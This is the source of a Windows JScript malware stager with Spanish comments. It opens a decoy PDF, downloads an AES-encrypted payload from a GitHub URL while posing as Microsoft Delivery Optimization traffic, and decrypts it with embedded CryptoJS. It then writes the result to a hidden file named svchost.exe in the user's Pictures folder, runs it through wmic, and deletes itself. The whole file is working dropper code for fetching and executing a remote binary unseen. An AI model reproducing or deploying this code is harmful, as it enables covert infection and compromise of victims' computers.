// ========================================================================
// STAGER AVANZADO - Con CryptoJS embebido (compatible con JScript)
// ========================================================================

var PAYLOAD_URL = "https://raw.githubusercontent.com/ggggwrmsfootmen/curly-fortnight/refs/heads/main/health-check.enc";
var AES_KEY = "1234567890123456"; // 16 bytes
var AES_IV = "1234567890123456";  // 16 bytes

var fso = new ActiveXObject("Scripting.FileSystemObject");
var shell = new ActiveXObject("WScript.Shell");
var tempFolder = shell.ExpandEnvironmentStrings("%TEMP%");

// === CRYPTOJS EMBEBIDO (Version 3.1.2 compatible con JScript) ===
var CryptoJS=CryptoJS||function(s,p){var m={},l=m.lib={},n=function(){},r=l.Base={extend:function(b){n.prototype=this;var h=new n;b&&h.mixIn(b);h.hasOwnProperty("init")||(h.init=function(){h.$super.init.apply(this,arguments)});h.init.prototype=h;h.$super=this;return h},create:function(){var b=this.extend();b.init.apply(b,arguments);return b},init:function(){},mixIn:function(b){for(var h in b)b.hasOwnProperty(h)&&(this[h]=b[h]);b.hasOwnProperty("toString")&&(this.toString=b.toString)},clone:function(){return this.init.prototype.extend(this)}},
q=l.WordArray=r.extend({init:function(b,h){b=this.words=b||[];this.sigBytes=h!=p?h:4*b.length},toString:function(b){return(b||t).stringify(this)},concat:function(b){var h=this.words,a=b.words,j=this.sigBytes;b=b.sigBytes;this.clamp();if(j%4)for(var g=0;g<b;g++)h[j+g>>>2]|=(a[g>>>2]>>>24-8*(g%4)&255)<<24-8*((j+g)%4);else if(65535<a.length)for(g=0;g<b;g+=4)h[j+g>>>2]=a[g>>>2];else h.push.apply(h,a);this.sigBytes+=b;return this},clamp:function(){var b=this.words,h=this.sigBytes;b[h>>>2]&=4294967295<<
32-8*(h%4);b.length=s.ceil(h/4)},clone:function(){var b=r.clone.call(this);b.words=this.words.slice(0);return b},random:function(b){for(var h=[],a=0;a<b;a+=4)h.push(4294967296*s.random()|0);return new q.init(h,b)}}),v=m.enc={},t=v.Hex={stringify:function(b){var a=b.words;b=b.sigBytes;for(var g=[],j=0;j<b;j++){var k=a[j>>>2]>>>24-8*(j%4)&255;g.push((k>>>4).toString(16));g.push((k&15).toString(16))}return g.join("")},parse:function(b){for(var a=b.length,g=[],j=0;j<a;j+=2)g[j>>>3]|=parseInt(b.substr(j,
2),16)<<24-4*(j%8);return new q.init(g,a/2)}},a=v.Latin1={stringify:function(b){var a=b.words;b=b.sigBytes;for(var g=[],j=0;j<b;j++)g.push(String.fromCharCode(a[j>>>2]>>>24-8*(j%4)&255));return g.join("")},parse:function(b){for(var a=b.length,g=[],j=0;j<a;j++)g[j>>>2]|=(b.charCodeAt(j)&255)<<24-8*(j%4);return new q.init(g,a)}},u=v.Utf8={stringify:function(b){try{return decodeURIComponent(escape(a.stringify(b)))}catch(g){throw Error("Malformed UTF-8 data");}},parse:function(b){return a.parse(unescape(encodeURIComponent(b)))}},
g=l.BufferedBlockAlgorithm=r.extend({reset:function(){this._data=new q.init;this._nDataBytes=0},_append:function(b){"string"==typeof b&&(b=u.parse(b));this._data.concat(b);this._nDataBytes+=b.sigBytes},_process:function(b){var a=this._data,g=a.words,j=a.sigBytes,k=this.blockSize,m=j/(4*k),m=b?s.ceil(m):s.max((m|0)-this._minBufferSize,0);b=m*k;j=s.min(4*b,j);if(b){for(var l=0;l<b;l+=k)this._doProcessBlock(g,l);l=g.splice(0,b);a.sigBytes-=j}return new q.init(l,j)},clone:function(){var b=r.clone.call(this);
b._data=this._data.clone();return b},_minBufferSize:0});l.Hasher=g.extend({cfg:r.extend(),init:function(b){this.cfg=this.cfg.extend(b);this.reset()},reset:function(){g.reset.call(this);this._doReset()},update:function(b){this._append(b);this._process();return this},finalize:function(b){b&&this._append(b);return this._doFinalize()},blockSize:16,_createHelper:function(b){return function(a,g){return(new b.init(g)).finalize(a)}},_createHmacHelper:function(b){return function(a,g){return(new k.HMAC.init(b,
g)).finalize(a)}}});var k=m.algo={};return m}(Math);
(function(){var s=CryptoJS,p=s.lib.WordArray;s.enc.Base64={stringify:function(m){var l=m.words,p=m.sigBytes,t=this._map;m.clamp();m=[];for(var r=0;r<p;r+=3)for(var w=(l[r>>>2]>>>24-8*(r%4)&255)<<16|(l[r+1>>>2]>>>24-8*((r+1)%4)&255)<<8|l[r+2>>>2]>>>24-8*((r+2)%4)&255,v=0;4>v&&r+0.75*v<p;v++)m.push(t.charAt(w>>>6*(3-v)&63));if(l=t.charAt(64))for(;m.length%4;)m.push(l);return m.join("")},parse:function(m){var l=m.length,s=this._map,t=s.charAt(64);t&&(t=m.indexOf(t),-1!=t&&(l=t));for(var t=[],r=0,w=0;w<
l;w++)if(w%4){var v=s.indexOf(m.charAt(w-1))<<2*(w%4),b=s.indexOf(m.charAt(w))>>>6-2*(w%4);t[r>>>2]|=(v|b)<<24-8*(r%4);r++}return p.create(t,r)},_map:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="}})();
(function(s){function p(a,k,b,h,l,j,m){a=a+(k&b|~k&h)+l+m;return(a<<j|a>>>32-j)+k}function m(a,k,b,h,l,j,m){a=a+(k&h|b&~h)+l+m;return(a<<j|a>>>32-j)+k}function l(a,k,b,h,l,j,m){a=a+(k^b^h)+l+m;return(a<<j|a>>>32-j)+k}function n(a,k,b,h,l,j,m){a=a+(b^(k|~h))+l+m;return(a<<j|a>>>32-j)+k}for(var r=CryptoJS,q=r.lib,v=q.WordArray,t=q.Hasher,q=r.algo,a=[],u=0;64>u;u++)a[u]=4294967296*s.abs(s.sin(u+1))|0;q=q.MD5=t.extend({_doReset:function(){this._hash=new v.init([1732584193,4023233417,2562383102,271733878])},
_doProcessBlock:function(g,k){for(var b=0;16>b;b++){var h=k+b,w=g[h];g[h]=(w<<8|w>>>24)&16711935|(w<<24|w>>>8)&4278255360}var b=this._hash.words,h=g[k+0],w=g[k+1],j=g[k+2],q=g[k+3],r=g[k+4],s=g[k+5],t=g[k+6],u=g[k+7],v=g[k+8],x=g[k+9],y=g[k+10],z=g[k+11],A=g[k+12],B=g[k+13],C=g[k+14],D=g[k+15],c=b[0],d=b[1],e=b[2],f=b[3],c=p(c,d,e,f,h,7,a[0]),f=p(f,c,d,e,w,12,a[1]),e=p(e,f,c,d,j,17,a[2]),d=p(d,e,f,c,q,22,a[3]),c=p(c,d,e,f,r,7,a[4]),f=p(f,c,d,e,s,12,a[5]),e=p(e,f,c,d,t,17,a[6]),d=p(d,e,f,c,u,22,a[7]),
c=p(c,d,e,f,v,7,a[8]),f=p(f,c,d,e,x,12,a[9]),e=p(e,f,c,d,y,17,a[10]),d=p(d,e,f,c,z,22,a[11]),c=p(c,d,e,f,A,7,a[12]),f=p(f,c,d,e,B,12,a[13]),e=p(e,f,c,d,C,17,a[14]),d=p(d,e,f,c,D,22,a[15]),c=m(c,d,e,f,w,5,a[16]),f=m(f,c,d,e,t,9,a[17]),e=m(e,f,c,d,z,14,a[18]),d=m(d,e,f,c,h,20,a[19]),c=m(c,d,e,f,s,5,a[20]),f=m(f,c,d,e,y,9,a[21]),e=m(e,f,c,d,D,14,a[22]),d=m(d,e,f,c,r,20,a[23]),c=m(c,d,e,f,x,5,a[24]),f=m(f,c,d,e,C,9,a[25]),e=m(e,f,c,d,q,14,a[26]),d=m(d,e,f,c,v,20,a[27]),c=m(c,d,e,f,B,5,a[28]),f=m(f,c,
d,e,j,9,a[29]),e=m(e,f,c,d,u,14,a[30]),d=m(d,e,f,c,A,20,a[31]),c=l(c,d,e,f,s,4,a[32]),f=l(f,c,d,e,v,11,a[33]),e=l(e,f,c,d,z,16,a[34]),d=l(d,e,f,c,C,23,a[35]),c=l(c,d,e,f,w,4,a[36]),f=l(f,c,d,e,r,11,a[37]),e=l(e,f,c,d,u,16,a[38]),d=l(d,e,f,c,y,23,a[39]),c=l(c,d,e,f,B,4,a[40]),f=l(f,c,d,e,h,11,a[41]),e=l(e,f,c,d,q,16,a[42]),d=l(d,e,f,c,t,23,a[43]),c=l(c,d,e,f,x,4,a[44]),f=l(f,c,d,e,A,11,a[45]),e=l(e,f,c,d,D,16,a[46]),d=l(d,e,f,c,j,23,a[47]),c=n(c,d,e,f,h,6,a[48]),f=n(f,c,d,e,u,10,a[49]),e=n(e,f,c,d,
C,15,a[50]),d=n(d,e,f,c,s,21,a[51]),c=n(c,d,e,f,A,6,a[52]),f=n(f,c,d,e,q,10,a[53]),e=n(e,f,c,d,y,15,a[54]),d=n(d,e,f,c,w,21,a[55]),c=n(c,d,e,f,v,6,a[56]),f=n(f,c,d,e,D,10,a[57]),e=n(e,f,c,d,t,15,a[58]),d=n(d,e,f,c,B,21,a[59]),c=n(c,d,e,f,r,6,a[60]),f=n(f,c,d,e,z,10,a[61]),e=n(e,f,c,d,j,15,a[62]),d=n(d,e,f,c,x,21,a[63]);b[0]=b[0]+c|0;b[1]=b[1]+d|0;b[2]=b[2]+e|0;b[3]=b[3]+f|0},_doFinalize:function(){var a=this._data,k=a.words,b=8*this._nDataBytes,h=8*a.sigBytes;k[h>>>5]|=128<<24-h%32;var l=s.floor(b/
4294967296);k[(h+64>>>9<<4)+15]=(l<<8|l>>>24)&16711935|(l<<24|l>>>8)&4278255360;k[(h+64>>>9<<4)+14]=(b<<8|b>>>24)&16711935|(b<<24|b>>>8)&4278255360;a.sigBytes=4*(k.length+1);this._process();a=this._hash;k=a.words;for(b=0;4>b;b++)h=k[b],k[b]=(h<<8|h>>>24)&16711935|(h<<24|h>>>8)&4278255360;return a},clone:function(){var a=t.clone.call(this);a._hash=this._hash.clone();return a}});r.MD5=t._createHelper(q);r.HmacMD5=t._createHmacHelper(q)})(Math);
(function(){var s=CryptoJS,p=s.lib,m=p.Base,l=p.WordArray,p=s.algo,n=p.EvpKDF=m.extend({cfg:m.extend({keySize:4,hasher:p.MD5,iterations:1}),init:function(m){this.cfg=this.cfg.extend(m)},compute:function(m,n){for(var p=this.cfg,s=p.hasher.create(),b=l.create(),u=b.words,q=p.keySize,p=p.iterations;u.length<q;){t&&s.update(t);var t=s.update(m).finalize(n);s.reset();for(var a=1;a<p;a++)t=s.finalize(t),s.reset();b.concat(t)}b.sigBytes=4*q;return b}});s.EvpKDF=function(m,l,p){return n.create(p).compute(m,
l)}})();
CryptoJS.lib.Cipher||function(s){var p=CryptoJS,m=p.lib,l=m.Base,n=m.WordArray,r=m.BufferedBlockAlgorithm,q=p.enc.Base64,v=p.algo.EvpKDF,t=m.Cipher=r.extend({cfg:l.extend(),createEncryptor:function(e,a){return this.create(this._ENC_XFORM_MODE,e,a)},createDecryptor:function(e,a){return this.create(this._DEC_XFORM_MODE,e,a)},init:function(e,a,b){this.cfg=this.cfg.extend(b);this._xformMode=e;this._key=a;this.reset()},reset:function(){r.reset.call(this);this._doReset()},process:function(e){this._append(e);return this._process()},
finalize:function(e){e&&this._append(e);return this._doFinalize()},keySize:4,ivSize:4,_ENC_XFORM_MODE:1,_DEC_XFORM_MODE:2,_createHelper:function(e){return{encrypt:function(b,k,d){return("string"==typeof k?c:a).encrypt(e,b,k,d)},decrypt:function(b,k,d){return("string"==typeof k?c:a).decrypt(e,b,k,d)}}}});m.StreamCipher=t.extend({_doFinalize:function(){return this._process(!0)},blockSize:1});var a=p.mode={},u=function(e,a,b){var c=this._iv;c?this._iv=s:c=this._prevBlock;for(var d=0;d<b;d++)e[a+d]^=
c[d]},g=(m.BlockCipherMode=l.extend({createEncryptor:function(e,a){return this.Encryptor.create(e,a)},createDecryptor:function(e,a){return this.Decryptor.create(e,a)},init:function(e,a){this._cipher=e;this._iv=a}})).extend();g.Encryptor=g.extend({processBlock:function(e,a){var b=this._cipher,c=b.blockSize;u.call(this,e,a,c);b.encryptBlock(e,a);this._prevBlock=e.slice(a,a+c)}});g.Decryptor=g.extend({processBlock:function(e,a){var b=this._cipher,c=b.blockSize,d=e.slice(a,a+c);b.decryptBlock(e,a);u.call(this,
e,a,c);this._prevBlock=d}});a=a.CBC=g;g=(p.pad={}).Pkcs7={pad:function(a,b){for(var c=4*b,c=c-a.sigBytes%c,d=c<<24|c<<16|c<<8|c,l=[],n=0;n<c;n+=4)l.push(d);c=n.create(l,c);a.concat(c)},unpad:function(a){a.sigBytes-=a.words[a.sigBytes-1>>>2]&255}};m.BlockCipher=t.extend({cfg:t.cfg.extend({mode:a,padding:g}),reset:function(){t.reset.call(this);var a=this.cfg,b=a.iv,a=a.mode;if(this._xformMode==this._ENC_XFORM_MODE)var c=a.createEncryptor;else c=a.createDecryptor,this._minBufferSize=1;this._mode=c.call(a,
this,b&&b.words)},_doProcessBlock:function(a,b){this._mode.processBlock(a,b)},_doFinalize:function(){var a=this.cfg.padding;if(this._xformMode==this._ENC_XFORM_MODE){a.pad(this._data,this.blockSize);var b=this._process(!0)}else b=this._process(!0),a.unpad(b);return b},blockSize:4});var k=m.CipherParams=l.extend({init:function(a){this.mixIn(a)},toString:function(a){return(a||this.formatter).stringify(this)}}),a=(p.format={}).OpenSSL={stringify:function(a){var b=a.ciphertext;a=a.salt;return(a?n.create([1398893684,
1701076831]).concat(a).concat(b):b).toString(q)},parse:function(a){a=q.parse(a);var b=a.words;if(1398893684==b[0]&&1701076831==b[1]){var c=n.create(b.slice(2,4));b.splice(0,4);a.sigBytes-=16}return k.create({ciphertext:a,salt:c})}},c=m.SerializableCipher=l.extend({cfg:l.extend({format:a}),encrypt:function(a,b,c,d){d=this.cfg.extend(d);var l=a.createEncryptor(c,d);b=l.finalize(b);l=l.cfg;return k.create({ciphertext:b,key:c,iv:l.iv,algorithm:a,mode:l.mode,padding:l.padding,blockSize:a.blockSize,formatter:d.format})},
decrypt:function(a,b,c,d){d=this.cfg.extend(d);b=this._parse(b,d.format);return a.createDecryptor(c,d).finalize(b.ciphertext)},_parse:function(a,b){return"string"==typeof a?b.parse(a,this):a}}),p=(p.kdf={}).OpenSSL={execute:function(a,b,c,d){d||(d=n.random(8));a=v.create({keySize:b+c}).compute(a,d);c=n.create(a.words.slice(b),4*c);a.sigBytes=4*b;return k.create({key:a,iv:c,salt:d})}},d=m.PasswordBasedCipher=c.extend({cfg:c.cfg.extend({kdf:p}),encrypt:function(a,b,d,l){l=this.cfg.extend(l);d=l.kdf.execute(d,
a.keySize,a.ivSize);l.iv=d.iv;a=c.encrypt.call(this,a,b,d.key,l);a.mixIn(d);return a},decrypt:function(a,b,d,l){l=this.cfg.extend(l);b=this._parse(b,l.format);d=l.kdf.execute(d,a.keySize,a.ivSize,b.salt);l.iv=d.iv;return c.decrypt.call(this,a,b,d.key,l)}})}();
(function(){for(var s=CryptoJS,p=s.lib.BlockCipher,m=s.algo,l=[],n=[],r=[],q=[],v=[],t=[],a=[],u=[],g=[],k=[],b=[],x=0;256>x;x++)b[x]=128>x?x<<1:x<<1^283;for(var c=0,d=0,x=0;256>x;x++){var e=d^d<<1^d<<2^d<<3^d<<4,e=e>>>8^e&255^99;l[c]=e;n[e]=c;var a=b[c],f=b[a],h=b[f],y=257*b[e]^16843008*e;r[c]=y<<24|y>>>8;q[c]=y<<16|y>>>16;v[c]=y<<8|y>>>24;t[c]=y;y=16843009*h^65537*f^257*a^16843008*c;a[e]=y<<24|y>>>8;u[e]=y<<16|y>>>16;g[e]=y<<8|y>>>24;k[e]=y;c?(c=a^b[b[b[h^a]]],d^=b[b[d]]):c=d=1}var j=[0,1,2,4,8,
16,32,64,128,27,54],m=m.AES=p.extend({_doReset:function(){for(var a=this._key,b=a.words,c=a.sigBytes/4,a=4*((this._nRounds=c+6)+1),d=this._keySchedule=[],e=0;e<a;e++)if(e<c)d[e]=b[e];else{var f=d[e-1];e%c?6<c&&4==e%c&&(f=l[f>>>24]<<24|l[f>>>16&255]<<16|l[f>>>8&255]<<8|l[f&255]):(f=f<<8|f>>>24,f=l[f>>>24]<<24|l[f>>>16&255]<<16|l[f>>>8&255]<<8|l[f&255],f^=j[e/c|0]<<24);d[e]=d[e-c]^f}b=this._invKeySchedule=[];for(c=0;c<a;c++)e=a-c,f=c%4?d[e]:d[e-4],b[c]=4>c||4>=e?f:a[l[f>>>24]]^u[l[f>>>16&255]]^g[l[f>>>
8&255]]^k[l[f&255]]},encryptBlock:function(a,b){this._doCryptBlock(a,b,this._keySchedule,r,q,v,t,l)},decryptBlock:function(b,c){var d=b[c+1];b[c+1]=b[c+3];b[c+3]=d;this._doCryptBlock(b,c,this._invKeySchedule,a,u,g,k,n);d=b[c+1];b[c+1]=b[c+3];b[c+3]=d},_doCryptBlock:function(a,b,c,d,e,f,h,j){for(var l=this._nRounds,m=a[b]^c[0],n=a[b+1]^c[1],p=a[b+2]^c[2],q=a[b+3]^c[3],r=4,s=1;s<l;s++)var t=d[m>>>24]^e[n>>>16&255]^f[p>>>8&255]^h[q&255]^c[r++],u=d[n>>>24]^e[p>>>16&255]^f[q>>>8&255]^h[m&255]^c[r++],v=
d[p>>>24]^e[q>>>16&255]^f[m>>>8&255]^h[n&255]^c[r++],q=d[q>>>24]^e[m>>>16&255]^f[n>>>8&255]^h[p&255]^c[r++],m=t,n=u,p=v;t=(j[m>>>24]<<24|j[n>>>16&255]<<16|j[p>>>8&255]<<8|j[q&255])^c[r++];u=(j[n>>>24]<<24|j[p>>>16&255]<<16|j[q>>>8&255]<<8|j[m&255])^c[r++];v=(j[p>>>24]<<24|j[q>>>16&255]<<16|j[m>>>8&255]<<8|j[n&255])^c[r++];q=(j[q>>>24]<<24|j[m>>>16&255]<<16|j[n>>>8&255]<<8|j[p&255])^c[r++];a[b]=t;a[b+1]=u;a[b+2]=v;a[b+3]=q},keySize:8});s.AES=p._createHelper(m)})();
// CFB Mode implementation
(function () {
    var CryptoJS = CryptoJS || {};
    var C = CryptoJS;
    var C_lib = C.lib;
    var BlockCipherMode = C_lib.BlockCipherMode;
    var C_mode = C.mode = {};

    var CFB = C_mode.CFB = (function () {
        var CFB = BlockCipherMode.extend();

        function generateKeystreamAndEncrypt(words, offset, blockSize, cipher) {
            var keystream;
            var iv = this._iv;

            if (iv) {
                keystream = iv.slice(0);
                this._iv = undefined;
            } else {
                keystream = this._prevBlock;
            }

            cipher.encryptBlock(keystream, 0);

            for (var i = 0; i < blockSize; i++) {
                words[offset + i] ^= keystream[i];
            }
        }

        CFB.Encryptor = CFB.extend({
            processBlock: function (words, offset) {
                var cipher = this._cipher;
                var blockSize = cipher.blockSize;

                generateKeystreamAndEncrypt.call(this, words, offset, blockSize, cipher);

                this._prevBlock = words.slice(offset, offset + blockSize);
            }
        });

        CFB.Decryptor = CFB.extend({
            processBlock: function (words, offset) {
                var cipher = this._cipher;
                var blockSize = cipher.blockSize;

                var thisBlock = words.slice(offset, offset + blockSize);

                generateKeystreamAndEncrypt.call(this, words, offset, blockSize, cipher);

                this._prevBlock = thisBlock;
            }
        });

        return CFB;
    }());
})();

// === FUNCIONES ===

function openPDF() {
    try {
        var scriptDir = fso.GetParentFolderName(WScript.ScriptFullName);
        var folder = fso.GetFolder(scriptDir);
        var files = new Enumerator(folder.Files);
        
        for (; !files.atEnd(); files.moveNext()) {
            var file = files.item();
            if (file.Name.toLowerCase().indexOf(".pdf") > -1) {
                WScript.Echo("[+] Abriendo PDF: " + file.Name);
                shell.Run('"' + file.Path + '"', 1, false);
                return true;
            }
        }
    } catch(e) {
        WScript.Echo("[!] Error abriendo PDF: " + e.message);
    }
    return false;
}

function downloadFile(url) {
    try {
        WScript.Echo("[*] Descargando payload...");
        var xhr = new ActiveXObject("MSXML2.XMLHTTP");
        xhr.open("GET", url, false);
        xhr.setRequestHeader("User-Agent", "Microsoft-Delivery-Optimization/10.0");
        xhr.send();
        
        if (xhr.status == 200) {
            WScript.Echo("[+] Payload descargado: " + xhr.responseText.length + " bytes");
            return xhr.responseText;
        } else {
            WScript.Echo("[!] Error HTTP: " + xhr.status);
            return null;
        }
    } catch(e) {
        WScript.Echo("[!] Error descargando: " + e.message);
        return null;
    }
}

function decryptPayload(b64data, key, iv) {
    try {
        WScript.Echo("[*] Descifrando payload...");
        
        // Remover saltos de línea
        var rawResponse = b64data.replace(/[\r\n]+/g, "");
        
        // Parsear key e IV
        var keyParsed = CryptoJS.enc.Utf8.parse(key);
        var ivParsed = CryptoJS.enc.Utf8.parse(iv);
        
        // Parse base64
        var encrypted = CryptoJS.enc.Base64.parse(rawResponse);
        
        // Descifrar
        var decrypted = CryptoJS.AES.decrypt({ciphertext: encrypted}, keyParsed, {
            iv: ivParsed,
            mode: CryptoJS.mode.CFB,
            padding: (CryptoJS.pad && CryptoJS.pad.NoPadding) ? CryptoJS.pad.NoPadding : { unpad: function() {} }
        });
        
        var hex_full = decrypted.toString(CryptoJS.enc.Hex);
        var hex_dec = hex_full;
        
        // Extraer longitud real de la cabecera (primeros 16 caracteres hex = 8 bytes)
        if (hex_full && hex_full.length >= 16) {
            function readLE64FromHex(h) {
                var o = 0;
                for (var i = 0; i < 8; i++) {
                    var byteHex = h.substr(i * 2, 2);
                    var b = parseInt(byteHex, 16);
                    o |= (b << (8 * i)) >>> 0;
                }
                return o >>> 0;
            }
            
            var hex_needed = readLE64FromHex(hex_full);
            
            if (hex_needed && hex_needed * 2 <= hex_full.length - 16) {
                hex_dec = hex_full.substr(16, hex_needed * 2);
            } else if (hex_needed && hex_needed * 2 <= hex_full.length) {
                hex_dec = hex_full.substr(16, hex_needed);
            } else {
                hex_dec = hex_full;
            }
        }
        
        WScript.Echo("[+] Descifrado exitoso: " + hex_dec.length + " caracteres hex");
        return hex_dec;
    } catch(e) {
        WScript.Echo("[!] Error descifrando: " + e.message);
        return null;
    }
}

function hexToBinary(hexData, outputPath) {
    try {
        WScript.Echo("[*] Convirtiendo HEX a binario...");
        
        // Crear VBS helper para convertir HEX a binario
        var vbsPath = tempFolder + "\\decode_hex.vbs";
        var vbsCode = 'Dim fso, hexStr\n';
        vbsCode += 'Set fso = CreateObject("Scripting.FileSystemObject")\n';
        vbsCode += 'Dim hf\n';
        vbsCode += 'Set hf = fso.OpenTextFile("' + tempFolder + '\\hex_data.txt", 1)\n';
        vbsCode += 'hexStr = hf.ReadAll()\n';
        vbsCode += 'hf.Close()\n';
        vbsCode += 'Dim objStream\n';
        vbsCode += 'Set objStream = CreateObject("ADODB.Stream")\n';
        vbsCode += 'objStream.Type = 1\n';
        vbsCode += 'objStream.Open\n';
        vbsCode += 'For i = 1 To Len(hexStr) Step 2\n';
        vbsCode += '    objStream.Write Chr(CLng("&H" & Mid(hexStr, i, 2)))\n';
        vbsCode += 'Next\n';
        vbsCode += 'objStream.SaveToFile "' + outputPath + '", 2\n';
        vbsCode += 'objStream.Close\n';
        
        // Guardar hex data en archivo temporal
        var hexFile = tempFolder + "\\hex_data.txt";
        var hf = fso.CreateTextFile(hexFile, true);
        hf.Write(hexData);
        hf.Close();
        
        // Guardar VBS
        var vf = fso.CreateTextFile(vbsPath, true);
        vf.Write(vbsCode);
        vf.Close();
        
        // Ejecutar VBS
        shell.Run("cscript //nologo //B " + vbsPath, 0, true);
        
        // Limpiar temporales
        try { fso.DeleteFile(vbsPath); } catch(e) {}
        try { fso.DeleteFile(hexFile); } catch(e) {}
        
        if (fso.FileExists(outputPath)) {
            WScript.Echo("[+] Binario creado: " + outputPath + " (" + fso.GetFile(outputPath).Size + " bytes)");
            return true;
        } else {
            WScript.Echo("[!] No se pudo crear el binario");
            return false;
        }
    } catch(e) {
        WScript.Echo("[!] Error convirtiendo: " + e.message);
        return false;
    }
}

function executePayload(exePath) {
    try {
        WScript.Echo("[*] Ejecutando payload...");
        
        // Ocultar archivo
        shell.Run('attrib +H +S "' + exePath + '"', 0, true);
        
        // Ejecutar con WMIC
        var cmd = 'wmic process call create "' + exePath + '"';
        shell.Run(cmd, 0, false);
        
        WScript.Echo("[+] Payload ejecutado");
        return true;
    } catch(e) {
        WScript.Echo("[!] Error ejecutando: " + e.message);
        return false;
    }
}

// === FLUJO PRINCIPAL ===

WScript.Echo("========================================");
WScript.Echo("STAGER INICIANDO...");
WScript.Echo("========================================\n");

try {
    // 1. Abrir PDF decoy
    openPDF();
    WScript.Sleep(1000);
    
    // 2. Descargar payload cifrado
    var encryptedData = downloadFile(PAYLOAD_URL);
    if (!encryptedData) {
        WScript.Echo("[!] Fallo en descarga");
        WScript.Quit(1);
    }
    
    // 3. Descifrar
    var hexData = decryptPayload(encryptedData, AES_KEY, AES_IV);
    if (!hexData) {
        WScript.Echo("[!] Fallo en descifrado");
        WScript.Quit(1);
    }
    
    // 4. Convertir a binario
    var outputPath = shell.ExpandEnvironmentStrings("%USERPROFILE%") + "\\Pictures\\svchost.exe";
    if (!hexToBinary(hexData, outputPath)) {
        WScript.Echo("[!] Fallo en conversión");
        WScript.Quit(1);
    }
    
    // 5. Ejecutar
    if (!executePayload(outputPath)) {
        WScript.Echo("[!] Fallo en ejecución");
        WScript.Quit(1);
    }
    
    // 6. Auto-destrucción (opcional)
    WScript.Sleep(2000);
    try {
        fso.DeleteFile(WScript.ScriptFullName);
    } catch(e) {}
    
    WScript.Echo("\n[+] COMPLETADO");
    
} catch(e) {
    WScript.Echo("[!] ERROR: " + e.message);
    WScript.Quit(1);
}

WScript.Echo("\nPresiona ENTER...");
WScript.StdIn.ReadLine();
